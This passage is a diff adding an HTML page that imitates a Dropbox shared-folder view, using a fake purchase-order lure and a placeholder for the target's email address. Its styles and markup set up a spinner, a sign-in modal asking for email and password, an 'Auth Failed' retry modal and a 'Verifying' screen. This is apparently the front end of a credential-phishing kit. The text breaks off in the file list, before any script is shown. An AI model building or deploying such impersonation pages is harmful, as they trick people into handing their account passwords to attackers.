@@ -1,0 +1,959 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dropbox – Purchase Order PO-2025-0123</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 218 185'%3E%3Cpath fill='%230061FE' d='M54.5 0L0 35.5l54.5 35.5 54.5-35.5zm109 0l-54.5 35.5 54.5 35.5L218 35.5zM0 106.5L54.5 142l54.5-35.5L54.5 71zm163.5-35.5L109 106.5l54.5 35.5L218 106.5zM54.5 152.5L109 185l54.5-32.5L109 120z'/%3E%3C/svg%3E">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 13px; color: #1e1919; background: #fff; display: flex; height: 100vh; overflow: hidden; }
+
+    .sidebar { width: 176px; min-width: 176px; background: #fff; border-right: 1px solid #e8e8e8; display: flex; flex-direction: column; padding: 10px 0; }
+    .logo { display: flex; align-items: center; gap: 7px; padding: 4px 14px 14px; }
+    .logo svg { width: 26px; height: 26px; flex-shrink: 0; }
+    .logo-text { font-size: 16px; font-weight: 500; color: #1e1919; }
+    .btn-new { margin: 0 10px 12px; background: #0061fe; color: #fff; border: none; border-radius: 6px; padding: 7px 10px; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 5px; width: calc(100% - 20px); }
+    .btn-new .chev { margin-left: auto; font-size: 10px; }
+    .nav { display: flex; align-items: center; gap: 8px; padding: 6px 12px; font-size: 13px; color: #444; cursor: pointer; border-radius: 5px; margin: 0 5px; }
+    .nav:hover { background: #f5f5f5; }
+    .nav.active { background: #e8f0fe; color: #0061fe; font-weight: 500; }
+    .nav-ico { width: 15px; height: 15px; flex-shrink: 0; }
+    .sid-label { padding: 8px 14px 3px; font-size: 10px; font-weight: 500; color: #888; letter-spacing: .5px; text-transform: uppercase; }
+    .member-row { display: flex; align-items: center; gap: 7px; padding: 6px 14px; }
+    .av { width: 26px; height: 26px; border-radius: 50%; background: #0061fe; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 500; flex-shrink: 0; }
+    .member-name { font-size: 12px; font-weight: 500; }
+    .member-sub { font-size: 11px; color: #888; }
+    .storage-wrap { padding: 6px 14px; }
+    .storage-lbl { font-size: 11px; margin-bottom: 3px; color: #444; }
+    .bar-bg { height: 3px; background: #e0e0e0; border-radius: 2px; }
+    .bar-fill { height: 3px; background: #0061fe; border-radius: 2px; width: 48%; }
+    .status-row { display: flex; align-items: center; gap: 5px; font-size: 11px; padding: 5px 14px; color: #666; }
+    .dot-g { width: 7px; height: 7px; border-radius: 50%; background: #26c281; flex-shrink: 0; }
+    .upgrade { margin: 6px 10px; background: #f5f5f5; border-radius: 6px; padding: 8px 10px; font-size: 11px; color: #555; }
+    .upgrade a { color: #0061fe; text-decoration: none; font-weight: 500; }
+
+    .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative; }
+    .topbar { display: flex; align-items: center; justify-content: space-between; padding: 9px 16px; border-bottom: 1px solid #e8e8e8; }
+    .breadcrumb { display: flex; align-items: center; gap: 5px; font-size: 13px; color: #666; }
+    .breadcrumb a { color: #666; text-decoration: none; }
+    .breadcrumb a:hover { text-decoration: underline; }
+    .breadcrumb .cur { color: #1e1919; font-weight: 500; }
+    .tb-icons { display: flex; align-items: center; gap: 10px; }
+    .ib { background: none; border: none; cursor: pointer; color: #666; position: relative; padding: 2px; }
+    .notif-dot { position: absolute; top: 0; right: 0; width: 7px; height: 7px; border-radius: 50%; background: #e53935; border: 1.5px solid #fff; }
+    .av-top { width: 27px; height: 27px; border-radius: 50%; background: #0061fe; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 500; }
+
+    /* Selection bar */
+    .sel-bar { display: flex; align-items: center; padding: 7px 16px; border-bottom: 1px solid #e8e8e8; gap: 8px; }
+    .sel-info { display: flex; align-items: center; gap: 6px; flex: 1; font-size: 13px; color: #444; }
+    .sel-check { width: 18px; height: 18px; background: #0061fe; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .sel-count { font-weight: 500; color: #1e1919; }
+    .sel-size { color: #888; }
+    .sel-clear { background: none; border: none; font-size: 12px; color: #666; cursor: pointer; display: flex; align-items: center; gap: 3px; padding: 2px 6px; border-radius: 4px; }
+    .sel-clear:hover { background: #f5f5f5; }
+    .sel-info-hidden { display: none; }
+    .btn-dl-all { background: #fff; border: 1px solid #ccc; border-radius: 5px; padding: 5px 11px; font-size: 12px; cursor: pointer; color: #1e1919; display: flex; align-items: center; gap: 5px; }
+    .btn-dl-all:hover:not(:disabled) { background: #f5f5f5; }
+    .btn-dl-all:disabled { opacity: 0.45; cursor: not-allowed; }
+    .btn-dl-file { background: #0061fe; border: none; border-radius: 5px; padding: 5px 11px; font-size: 12px; color: #fff; cursor: pointer; display: flex; align-items: center; gap: 5px; font-weight: 500; }
+    .btn-dl-file:hover:not(:disabled) { background: #0050d8; }
+    .btn-dl-file:disabled { background: #a0b8fe; cursor: not-allowed; }
+    .btn-size-badge { background: rgba(255,255,255,0.25); border-radius: 4px; padding: 2px 6px; font-size: 11px; font-weight: 600; margin-left: 2px; display: none; }
+
+    .content { flex: 1; overflow-y: auto; padding: 0 16px 16px; }
+    .search-row { padding: 10px 0 8px; }
+    .sbox { display: flex; align-items: center; gap: 7px; border: 1px solid #ccc; border-radius: 7px; padding: 6px 10px; max-width: 320px; color: #999; font-size: 12px; }
+    .sbox input { border: none; outline: none; font-size: 12px; width: 100%; background: transparent; color: #1e1919; }
+    .meta { font-size: 12px; color: #666; padding-bottom: 5px; }
+    .thead { display: flex; align-items: center; padding: 3px 0 7px; border-bottom: 1px solid #e8e8e8; gap: 7px; }
+    .thead input { width: 14px; height: 14px; accent-color: #0061fe; }
+
+    .frow { display: flex; align-items: center; padding: 7px 0; border-bottom: 1px solid #f2f2f2; }
+    .frow:hover { background: #fafafa; }
+    .cc { width: 28px; flex-shrink: 0; }
+    .cc input { width: 14px; height: 14px; accent-color: #0061fe; cursor: pointer; }
+    .ci { width: 22px; flex-shrink: 0; }
+    .cn { flex: 1; display: flex; align-items: baseline; gap: 5px; overflow: hidden; min-width: 0; }
+    .cn .fn { font-weight: 500; white-space: nowrap; font-size: 12px; }
+    .cn .sb { color: #888; font-size: 11px; white-space: nowrap; }
+    .cd { width: 130px; flex-shrink: 0; font-size: 11px; color: #666; }
+    .cs { width: 170px; flex-shrink: 0; font-size: 11px; color: #666; display: flex; align-items: center; gap: 3px; }
+    .cz { width: 55px; flex-shrink: 0; font-size: 11px; color: #666; text-align: right; }
+    .ipdf { color: #e53935; }
+    .ixls { color: #1d8348; }
+    .idoc { color: #2e75b6; }
+    .ifol { color: #0061fe; }
+
+    .folder-row { display: flex; align-items: center; padding: 7px 0; border-bottom: 1px solid #f2f2f2; cursor: pointer; }
+    .folder-row:hover { background: #fafafa; }
+    .ftoggle { width: 18px; flex-shrink: 0; font-size: 10px; color: #888; transition: transform .2s; display: flex; align-items: center; justify-content: center; }
+    .ftoggle.collapsed { transform: rotate(-90deg); }
+    .folder-spacer { width: 28px; flex-shrink: 0; }
+    .finfo { flex: 1; display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 500; padding-left: 4px; }
+    .fcount { color: #888; font-size: 11px; font-weight: 400; }
+    .fdate { font-size: 11px; color: #888; margin-left: auto; padding-right: 2px; }
+    .sub { padding-left: 46px; }
+    .sub-hidden { display: none; }
+
+    .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.38); z-index: 100; align-items: center; justify-content: center; }
+    .overlay.show { display: flex; }
+
+    .modal-prep { background: #fff; border-radius: 14px; padding: 28px 28px 22px; width: 360px; box-shadow: 0 8px 32px rgba(0,0,0,.18); }
+    .modal-prep h2 { font-size: 18px; font-weight: 700; color: #1e1919; margin-bottom: 4px; }
+    .modal-prep .subtitle { font-size: 13px; color: #666; margin-bottom: 14px; }
+    .prog-bar-bg { height: 3px; background: #e0e0e0; border-radius: 2px; margin-bottom: 18px; }
+    .prog-bar-fill { height: 3px; background: #0061fe; border-radius: 2px; width: 0%; transition: width .05s linear; }
+
+    .file-card-icon { width: 36px; height: 36px; border-radius: 6px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .file-card-icon.pdf-icon { background: #fff0f0; }
+    .file-card-icon.xlsx-icon { background: #f0fff4; }
+    .file-card-icon.docx-icon { background: #f0f4ff; }
+    .file-card-name { font-size: 13px; font-weight: 500; color: #1e1919; }
+    .file-card-size { font-size: 12px; color: #888; }
+    .file-count { font-size: 12px; color: #888; text-align: center; margin-bottom: 16px; }
+    .modal-cancel { background: none; border: none; font-size: 13px; color: #444; cursor: pointer; float: right; }
+
+    .modal-signin { background: #fff; border-radius: 14px; width: 340px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,.18); }
+    .signin-header { background: #0061fe; padding: 22px; display: flex; align-items: center; justify-content: center; }
+    .signin-body { padding: 24px 24px 28px; }
+    .signin-title-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
+    .signin-title { font-size: 18px; font-weight: 700; color: #1e1919; }
+    .files-badge { background: #f0f0f0; border-radius: 6px; padding: 4px 10px; font-size: 12px; color: #444; font-weight: 500; }
+    .signin-sub { font-size: 13px; color: #666; margin-bottom: 18px; }
+    .field-label { font-size: 12px; color: #444; margin-bottom: 5px; }
+    .field-input { width: 100%; border: 1px solid #ccc; border-radius: 7px; padding: 9px 12px; font-size: 13px; outline: none; margin-bottom: 14px; color: #1e1919; }
+    .field-input:focus { border-color: #0061fe; }
+    .pass-wrap { position: relative; margin-bottom: 20px; }
+    .pass-wrap .field-input { margin-bottom: 0; padding-right: 38px; }
+    .pass-eye { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #888; }
+    .signin-actions { display: flex; align-items: center; justify-content: space-between; }
+    .cancel-link { background: none; border: none; font-size: 13px; color: #444; cursor: pointer; }
+    .signin-btn { background: #0061fe; color: #fff; border: none; border-radius: 7px; padding: 10px 22px; font-size: 14px; font-weight: 600; cursor: pointer; min-width: 140px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .signin-btn:hover { background: #0050d8; }
+    .signin-btn:disabled { background: #a0b8fe; cursor: not-allowed; }
+
+    /* Spinner inside sign-in button */
+    .btn-spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; display: none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Auth Failed modal */
+    .modal-auth-fail { background: #fff; border-radius: 18px; width: 340px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,.22); }
+    .auth-fail-top { background: linear-gradient(160deg, #ff6b6b 0%, #e53935 100%); padding: 36px 28px 32px; display: flex; align-items: center; justify-content: center; }
+    .auth-fail-circle { width: 64px; height: 64px; border-radius: 50%; background: rgba(255,255,255,0.25); display: flex; align-items: center; justify-content: center; }
+    .auth-fail-x { width: 44px; height: 44px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; }
+    .auth-fail-body { padding: 24px 28px 28px; text-align: center; }
+    .auth-fail-title { font-size: 20px; font-weight: 700; color: #1e1919; margin-bottom: 10px; }
+    .auth-fail-msg { font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+    .auth-fail-actions { display: flex; align-items: center; justify-content: center; gap: 14px; }
+    .auth-fail-cancel { background: none; border: none; font-size: 14px; color: #666; cursor: pointer; padding: 10px 18px; }
+    .auth-fail-cancel:hover { color: #1e1919; }
+    .auth-fail-retry { background: #e53935; color: #fff; border: none; border-radius: 8px; padding: 11px 28px; font-size: 14px; font-weight: 700; cursor: pointer; }
+    .auth-fail-retry:hover { background: #c62828; }
+
+    /* File card swipe-up carousel */
+    .file-card-wrap { overflow: hidden; height: 68px; position: relative; }
+    @keyframes swipeInUp  { from { opacity: 0; transform: translateY(60px); } to   { opacity: 1; transform: translateY(0);   } }
+    @keyframes swipeOutUp { from { opacity: 1; transform: translateY(0);    } to   { opacity: 0; transform: translateY(-60px); } }
+    .file-card { display: flex; align-items: center; gap: 12px; border: 1px solid #e8e8e8; border-radius: 8px; padding: 12px 14px; position: absolute; width: 100%; background: #fff; }
+    .file-card.swipe-in  { animation: swipeInUp  0.38s cubic-bezier(.4,0,.2,1) forwards; }
+    .file-card.swipe-out { animation: swipeOutUp 0.38s cubic-bezier(.4,0,.2,1) forwards; }
+
+    /* Verifying modal */
+    .modal-verify { background: #fff; border-radius: 14px; width: 340px; padding: 40px 28px; box-shadow: 0 8px 32px rgba(0,0,0,.18); display: flex; flex-direction: column; align-items: center; gap: 18px; }
+    .verify-spinner { width: 52px; height: 52px; border: 4px solid #e8e8e8; border-top-color: #0061fe; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    .verify-title { font-size: 17px; font-weight: 700; color: #1e1919; }
+    .verify-sub { font-size: 13px; color: #888; text-align: center; margin-top: -8px; }
+    /* ── MOBILE RESPONSIVE ───────────────────────────────────────────────── */
+    @media (max-width: 600px) {
+      body { flex-direction: column; height: 100dvh; overflow: hidden; }
+
+      /* Sidebar becomes a top header bar on mobile */
+      .sidebar {
+        width: 100%; min-width: unset;
+        flex-direction: row; align-items: center;
+        border-right: none; border-bottom: 1px solid #e8e8e8;
+        padding: 8px 14px; gap: 10px;
+        flex-shrink: 0; overflow: hidden;
+      }
+      .logo { padding: 0; flex-shrink: 0; }
+      .logo-text { font-size: 15px; }
+      .btn-new { display: none; }
+      .nav { display: none; }
+      .sid-label { display: none; }
+      .storage-wrap { display: none; }
+      .status-row { display: none; }
+      .upgrade { display: none; }
+
+      /* Member row goes to the right side of header */
+      .member-row {
+        margin-left: auto; padding: 0; gap: 6px;
+        flex-shrink: 0;
+      }
+      .av { width: 30px; height: 30px; font-size: 12px; }
+      .member-name { font-size: 11px; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+      .member-sub { display: none; }
+
+      /* Main fills the rest */
+      .main { flex: 1; overflow: hidden; display: flex; flex-direction: column; }
+
+      /* Topbar: show breadcrumb compactly */
+      .topbar { padding: 7px 12px; }
+      .breadcrumb { font-size: 11px; gap: 3px; overflow: hidden; }
+      .breadcrumb a { display: none; }
+      .breadcrumb a:last-of-type { display: inline; }
+      .breadcrumb .cur { font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 180px; }
+      .tb-icons { gap: 6px; }
+      .av-top { width: 26px; height: 26px; font-size: 10px; }
+
+      /* Selection bar: stack nicely on mobile */
+      .sel-bar {
+        flex-wrap: wrap; gap: 6px; padding: 8px 12px;
+      }
+      .sel-info { font-size: 12px; flex: 1; min-width: 120px; }
+      .btn-dl-all { font-size: 11px; padding: 6px 10px; flex-shrink: 0; }
+      .btn-dl-file { font-size: 11px; padding: 6px 10px; flex-shrink: 0; }
+      .btn-size-badge { font-size: 10px; padding: 1px 5px; }
+
+      /* File list: hide date and shared cols, keep name + size */
+      .content { padding: 0 10px 80px; }
+      .sbox { max-width: 100%; }
+      .cd { display: none; }
+      .cs { display: none; }
+      .cz { width: 50px; font-size: 11px; }
+      .cn .sb { display: none; }
+      .cn .fn { font-size: 13px; }
+      .frow { padding: 10px 0; }
+      .cc input { width: 18px; height: 18px; }
+      .fdate { display: none; }
+      .fcount { font-size: 11px; }
+
+      /* Modals: full width on mobile */
+      .modal-prep { width: calc(100vw - 32px); padding: 22px 18px 18px; border-radius: 12px; }
+      .modal-signin { width: calc(100vw - 32px); border-radius: 12px; }
+      .modal-verify { width: calc(100vw - 32px); padding: 32px 20px; border-radius: 12px; }
+      .modal-auth-fail { width: calc(100vw - 32px); border-radius: 14px; }
+      .signin-body { padding: 18px 18px 22px; }
+      .field-input { font-size: 16px; } /* prevent iOS zoom */
+
+      /* Floating download bar pinned at bottom on mobile */
+      .sel-bar {
+        position: fixed; bottom: 0; left: 0; right: 0;
+        background: #fff; border-top: 1px solid #e8e8e8;
+        border-bottom: none; z-index: 50;
+        padding: 10px 14px; box-shadow: 0 -2px 12px rgba(0,0,0,.08);
+      }
+    }
+    /* ── DROPBOX SPLASH LOADER ── */
+    #db-loader {
+      position: fixed; inset: 0; background: #fff;
+      z-index: 9999; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; gap: 28px;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+    #db-loader.hide { opacity: 0; visibility: hidden; }
+
+    .db-loader-logo {
+      display: flex; align-items: center; gap: 12px;
+      animation: dbFadeIn 0.5s ease forwards;
+    }
+    .db-loader-logo-text {
+      font-size: 28px; font-weight: 600; color: #1e1919; letter-spacing: -0.3px;
+    }
+
+    /* The 5-diamond Dropbox animation */
+    .db-diamonds {
+      display: grid;
+      grid-template-columns: repeat(5, 14px);
+      gap: 5px;
+      align-items: center;
+    }
+    .db-d {
+      width: 14px; height: 14px;
+      background: #0061fe;
+      clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+      animation: dbPulse 1.2s ease-in-out infinite;
+    }
+    .db-d:nth-child(1) { animation-delay: 0s;    }
+    .db-d:nth-child(2) { animation-delay: 0.15s; }
+    .db-d:nth-child(3) { animation-delay: 0.3s;  }
+    .db-d:nth-child(4) { animation-delay: 0.45s; }
+    .db-d:nth-child(5) { animation-delay: 0.6s;  }
+
+    @keyframes dbPulse {
+      0%, 100% { opacity: 0.2; transform: scale(0.7); }
+      50%       { opacity: 1;   transform: scale(1.15); }
+    }
+    @keyframes dbFadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .db-loader-sub {
+      font-size: 13px; color: #aaa; letter-spacing: 0.2px;
+      animation: dbFadeIn 0.7s ease 0.2s both;
+    }
+    /* Verifying modal - Dropbox diamonds */
+    .db-d { width:12px;height:12px;background:#0061fe;clip-path:polygon(50% 0%,100% 50%,50% 100%,0% 50%);animation:dbPulse 1.2s ease-in-out infinite; }
+    .db-d:nth-child(1){animation-delay:0s}
+    .db-d:nth-child(2){animation-delay:.15s}
+    .db-d:nth-child(3){animation-delay:.3s}
+    .db-d:nth-child(4){animation-delay:.45s}
+    .db-d:nth-child(5){animation-delay:.6s}
+    @keyframes dbPulse{0%,100%{opacity:.2;transform:scale(.7)}50%{opacity:1;transform:scale(1.15)}}
+  </style>
+</head>
+<body>
+
+<!-- ── DROPBOX SPLASH LOADER ── -->
+<div id="db-loader">
+  <div class="db-loader-logo">
+    <svg width="38" height="33" viewBox="0 0 218 185" fill="#0061fe" xmlns="http://www.w3.org/2000/svg">
+      <path d="M54.5 0L0 35.5l54.5 35.5 54.5-35.5zm109 0l-54.5 35.5 54.5 35.5L218 35.5zM0 106.5L54.5 142l54.5-35.5L54.5 71zm163.5-35.5L109 106.5l54.5 35.5L218 106.5zM54.5 152.5L109 185l54.5-32.5L109 120z"/>
+    </svg>
+    <span class="db-loader-logo-text">Dropbox</span>
+  </div>
+  <div class="db-diamonds">
+    <div class="db-d"></div>
+    <div class="db-d"></div>
+    <div class="db-d"></div>
+    <div class="db-d"></div>
+    <div class="db-d"></div>
+  </div>
+  <div class="db-loader-sub">Loading your shared files…</div>
+</div>
+
+<aside class="sidebar">
+  <div class="logo">
+    <svg viewBox="0 0 218 185" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#0061FE" d="M54.5 0L0 35.5l54.5 35.5 54.5-35.5zm109 0l-54.5 35.5 54.5 35.5L218 35.5zM0 106.5L54.5 142l54.5-35.5L54.5 71zm163.5-35.5L109 106.5l54.5 35.5L218 106.5zM54.5 152.5L109 185l54.5-32.5L109 120z"/>
+    </svg>
+    <span class="logo-text">Dropbox</span>
+  </div>
+  <button class="btn-new">
+    <svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M8 2a.75.75 0 01.75.75v4.5h4.5a.75.75 0 010 1.5h-4.5v4.5a.75.75 0 01-1.5 0v-4.5h-4.5a.75.75 0 010-1.5h4.5v-4.5A.75.75 0 018 2z"/></svg>
+    Create new <span class="chev">&#9660;</span>
+  </button>
+  <div class="nav"><svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1L1 7v8h5V9h4v6h5V7z"/></svg> Home</div>
+  <div class="nav"><svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M3 2h7l3 3v9H3V2zm7 0v3h3"/></svg> All files</div>
+  <div class="nav active"><svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2zm9-5a3 3 0 100-6 3 3 0 000 6zm2 1a5 5 0 012.83 4H14v-1a4 4 0 00-1-.13z"/></svg> Shared with company</div>
+  <div class="nav"><svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M2 3h12v10H2zm1 2v7h10V5H3zm1 1h8v1H4zm0 2h8v1H4zm0 2h5v1H4z"/></svg> Purchase Orders</div>
+  <div class="nav"><svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2h12v12H2zm2 2v8h8V4zm1 1h6v1H5zm0 2h6v1H5zm0 2h4v1H5z"/></svg> Quotations</div>
+  <div class="nav"><svg class="nav-ico" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2l1.5 11h9L14 2H2zm2 1h8l-1.2 9H5.2L4 3zm2 2v5h4V5H6zm1 1h2v3H7V6z"/></svg> Deleted files</div>
+  <div style="flex:1"></div>
+  <div class="sid-label">Members</div>
+  <div class="member-row">
+    <div class="av" id="sidebar-av">TT</div>
+    <div>
+      <div class="member-name" id="sidebar-email">{USER_EMAIL}</div>
+      <div class="member-sub">Only you</div>
+    </div>
+  </div>
+  <div class="storage-wrap">
+    <div class="storage-lbl">Storage &nbsp; 2.4 GB of 5 GB used</div>
+    <div class="bar-bg"><div class="bar-fill"></div></div>
+  </div>
+  <div class="status-row"><div class="dot-g"></div> Status &nbsp; Only you</div>
+  <div class="upgrade">
+    Need more space? Upgrade your plan to get 2 TB of storage.<br>
+    <a href="#">Upgrade now &rarr;</a>
+  </div>
+</aside>
+
+<div class="main">
+  <div class="topbar">
+    <div class="breadcrumb">
+      <a href="#">Dropbox</a> &rsaquo;
+      <a href="#">Procurement</a> &rsaquo;
+      <span class="cur">Purchase Order PO-2026-0123</span>
+    </div>
+    <div class="tb-icons">
+      <button class="ib" style="position:relative">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a5 5 0 00-5 5c0 2.5-1 3.5-1 4h12c0-.5-1-1.5-1-4a5 5 0 00-5-5zm0 14a2 2 0 002-2H6a2 2 0 002 2z"/></svg>
+        <span class="notif-dot"></span>
+      </button>
+      <button class="ib">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 3a.8.8 0 110 1.6A.8.8 0 018 4zm-1 3h2v4H7V7z"/></svg>
+      </button>
+      <button class="ib">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 5a1 1 0 100 2 1 1 0 000-2zm0 3a1 1 0 100 2 1 1 0 000-2zm0 3a1 1 0 100 2 1 1 0 000-2z"/></svg>
+      </button>
+      <div class="av-top" id="topbar-av">TT</div>
+    </div>
+  </div>
+
+  <!-- Selection bar -->
+  <div class="sel-bar">
+    <!-- Left: selection info (shown when items selected) -->
+    <div class="sel-info sel-info-hidden" id="sel-info">
+      <div class="sel-check">
+        <svg width="11" height="11" viewBox="0 0 16 16" fill="#fff"><path d="M2 8l4 4 8-8" stroke="#fff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <span class="sel-count" id="sel-count">0 selected</span>
+      <span class="sel-size" id="sel-size"></span>
+      <button class="sel-clear" onclick="clearSelection()">
+        <svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2l12 12M14 2L2 14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
+        Clear
+      </button>
+    </div>
+    <div style="flex:1"></div>
+    <!-- Right: buttons -->
+    <button class="btn-dl-all" id="btn-dl-all" onclick="startDownload(true)">
+      <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor"><path d="M8 12l-5-5 1.4-1.4L7 9.2V2h2v7.2l2.6-3.6L13 7l-5 5zM2 14h12v-2H2v2z"/></svg>
+      Download all
+    </button>
+    <button class="btn-dl-file" id="btn-dl-file" onclick="startDownload(false)" disabled>
+      <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor"><path d="M8 12l-5-5 1.4-1.4L7 9.2V2h2v7.2l2.6-3.6L13 7l-5 5zM2 14h12v-2H2v2z"/></svg>
+      <span id="btn-dl-label">Download file</span>
+      <span class="btn-size-badge" id="btn-size-badge"></span>
+    </button>
+  </div>
+
+  <div class="content">
+    <div class="search-row">
+      <div class="sbox">
+        <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor"><path d="M11.4 10l3.3 3.3-1.4 1.4L10 11.4A6 6 0 112 8a6 6 0 019.4 2zM7 11A4 4 0 107 3a4 4 0 000 8z"/></svg>
+        <input type="text" placeholder="Search files and folders...">
+      </div>
+    </div>
+    <div class="meta">11 items &nbsp;&bull;&nbsp; 22.7 MB</div>
+    <div class="thead">
+      <input type="checkbox" id="chk-all" onchange="toggleAll(this)">
+    </div>
+
+    <!-- Order List.pdf -->
+    <div class="frow" data-name="Order List.pdf" data-size="4.8 MB" data-type="pdf">
+      <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+      <div class="ci ipdf"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+      <div class="cn"><span class="fn">Order List.pdf</span><span class="sb">Shared by Acme Manufacturing</span></div>
+      <div class="cd">A few minutes ago</div>
+      <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+      <div class="cz">4.8 MB</div>
+    </div>
+
+    <!-- Drawings.pdf -->
+    <div class="frow" data-name="Drawings.pdf" data-size="4.8 MB" data-type="pdf">
+      <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+      <div class="ci ipdf"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+      <div class="cn"><span class="fn">Drawings.pdf</span><span class="sb">Shared by Acme Manufacturing</span></div>
+      <div class="cd">A few minutes ago</div>
+      <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+      <div class="cz">4.8 MB</div>
+    </div>
+
+    <!-- Bill of Quantity.xlsx -->
+    <div class="frow" data-name="Bill of Quantity.xlsx" data-size="892 KB" data-type="xlsx">
+      <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+      <div class="ci ixls"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 6h2v2H5zm3 0h2v2H8zm3 0h1v2h-1zM5 9h2v2H5zm3 0h2v2H8zm3 0h1v2h-1z"/></svg></div>
+      <div class="cn"><span class="fn">Bill of Quantity.xlsx</span><span class="sb">Shared by Acme Manufacturing</span></div>
+      <div class="cd">A few minutes ago</div>
+      <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+      <div class="cz">892 KB</div>
+    </div>
+
+    <!-- Product Specifications.xlsx -->
+    <div class="frow" data-name="Product Specifications.xlsx" data-size="1.2 MB" data-type="xlsx">
+      <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+      <div class="ci ixls"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 6h2v2H5zm3 0h2v2H8zm3 0h1v2h-1zM5 9h2v2H5zm3 0h2v2H8zm3 0h1v2h-1z"/></svg></div>
+      <div class="cn"><span class="fn">Product Specifications.xlsx</span><span class="sb">Shared by Acme Manufacturing</span></div>
+      <div class="cd">A few minutes ago</div>
+      <div class="cs"><svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M7 7a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H2z"/></svg> Shared with your company</div>
+      <div class="cz">1.2 MB</div>
+    </div>
+
+    <!-- Business Card.pdf -->
+    <div class="frow" data-name="Business Card.pdf" data-size="6.3 MB" data-type="pdf">
+      <div class="cc"><input type="checkbox" onchange="onCheck()"></div>
+      <div class="ci ipdf"><svg width="15" height="15" viewBox="0 0 16 16" fill="currentColor"><path d="M3 1h7l3 3v11H3V1zm7 0v3h3M5 7h6M5 9h6M5 11h4"/></svg></div>
+      <div class="cn"><span class="fn">Business Card.pdf</span><span class="sb">Shared by Acme Manufacturing</span></div>
+      <div class="cd">A few minutes ago</div>
